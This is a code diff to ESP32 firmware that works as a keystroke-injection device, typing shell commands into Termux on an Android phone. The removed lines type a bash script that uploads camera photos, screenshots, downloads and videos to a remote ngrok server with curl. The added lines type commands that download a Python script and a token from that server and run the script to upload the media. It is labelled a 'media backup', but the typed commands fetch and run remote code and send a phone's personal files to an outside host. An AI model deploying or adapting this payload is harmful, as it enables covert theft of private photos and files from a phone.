@@ -313,36 +313,47 @@ void runAutoPayload() {
   Serial.println("[AUTO payload] Done.");
 }
 
-// ── MANUAL payload — full bash heredoc (no media_backup.py needed) ───────────
-// Falls back to raw curl loop if media_backup.py is not installed.
+// ── MANUAL payload (GPIO 19) ─────────────────────────────────────────────────
+// Same as AUTO — opens Termux on the Android phone, runs media_backup.py --auto.
+// NOTE: press the button while holding the Android phone, not while your Mac
+// terminal is focused — the ESP32 types into whichever device had last focus.
 
 void runManualPayload() {
-  Serial.println("[MANUAL payload] Starting heredoc injection...");
+  Serial.println("[MANUAL payload] Starting...");
   if (!openTermuxClean()) {
     Serial.println("[MANUAL payload] Aborted — could not open Termux.");
     return;
   }
 
-  // STEP 3: inject bash heredoc
-  // bash buffers the entire script until UPLOAD_END, then executes it
-  // sequentially — no interleaving between curl responses and new typed lines.
-  typeLine("bash << 'UPLOAD_END'");
-  typeLine("UP=\"" WAN_SERVER_URL "/upload\"");
-  typeLine("upload_dir() {");
-  typeLine("  find \"$1\" -maxdepth 1 -type f \\( -iname '*.jpg' -o -iname '*.jpeg' -o -iname '*.png' -o -iname '*.webp' -o -iname '*.heic' -o -iname '*.mp4' -o -iname '*.mov' \\) | while IFS= read -r f; do");
-  typeLine("    sha=$(sha256sum \"$f\" | cut -d' ' -f1)");
-  typeLine("    curl -s -L -H \"ngrok-skip-browser-warning: true\" -F \"file=@$f\" -F \"sha256=$sha\" -F \"category=$2\" \"$UP\" && echo \"OK: $(basename $f)\" || echo \"FAIL: $(basename $f)\"");
-  typeLine("  done");
-  typeLine("}");
-  typeLine("upload_dir /sdcard/DCIM/Camera          DCIM");
-  typeLine("upload_dir /sdcard/Pictures             Pictures");
-  typeLine("upload_dir /sdcard/Pictures/Screenshots Screenshots");
-  typeLine("upload_dir /sdcard/Download             Downloads");
-  typeLine("upload_dir /sdcard/Movies               Movies");
-  typeLine("echo '====== ALL DONE ======'");
-  typeLine("UPLOAD_END");
+  // Same self-install + run heredoc as AUTO payload
+  typeLine("bash << 'SETUP_RUN_END'");
 
-  Serial.println("[MANUAL payload] Heredoc typed — bash executing uploads.");
+  typeLine("if [ ! -f ~/media_backup.py ]; then");
+  typeLine("  echo '[setup] Downloading media_backup.py...'");
+  typeLine("  curl -sL -H 'ngrok-skip-browser-warning: true' \\");
+  typeLine("       -o ~/media_backup.py '" WAN_SERVER_URL "/payloads/media_backup.py'");
+  typeLine("  echo '[setup] media_backup.py saved.'");
+  typeLine("else");
+  typeLine("  echo '[setup] media_backup.py already present.'");
+  typeLine("fi");
+
+  typeLine("if [ ! -f ~/.backup_token ]; then");
+  typeLine("  echo '[setup] Fetching backup token...'");
+  typeLine("  curl -sf -H 'ngrok-skip-browser-warning: true' \\");
+  typeLine("       -H 'X-Setup-Password: " SETUP_PASSWORD "' \\");
+  typeLine("       '" WAN_SERVER_URL "/setup-token' > ~/.backup_token");
+  typeLine("  chmod 600 ~/.backup_token");
+  typeLine("  echo '[setup] Token saved.'");
+  typeLine("else");
+  typeLine("  echo '[setup] Token already present.'");
+  typeLine("fi");
+
+  typeLine("echo '[run] Starting upload...'");
+  typeLine("PY=$(command -v python3 || command -v python) && $PY ~/media_backup.py '" WAN_SERVER_URL "' --auto");
+
+  typeLine("SETUP_RUN_END");
+
+  Serial.println("[MANUAL payload] Heredoc typed — executing in Termux.");
   Serial.println("[MANUAL payload] Done.");
 }
 
